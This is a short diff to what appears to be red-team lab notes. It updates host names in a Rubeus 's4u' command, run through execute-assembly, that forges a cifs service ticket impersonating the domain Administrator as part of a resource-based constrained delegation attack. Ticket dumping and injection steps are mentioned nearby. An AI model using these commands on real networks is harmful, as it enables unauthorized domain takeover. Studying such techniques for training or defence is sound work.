@@ -67,7 +67,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 
 
 Request a usable service ticket for cifs/RBCD_host impersonating the default domain administrator.
 ```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /nowrap /ticket:
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:ENC-JMP-1$ /impersonateuser:Administrator /msdsspn:cifs/enc-fs-1 /nowrap /ticket:
 ```
 
 Inject the ticket into a sacrificial logon session.
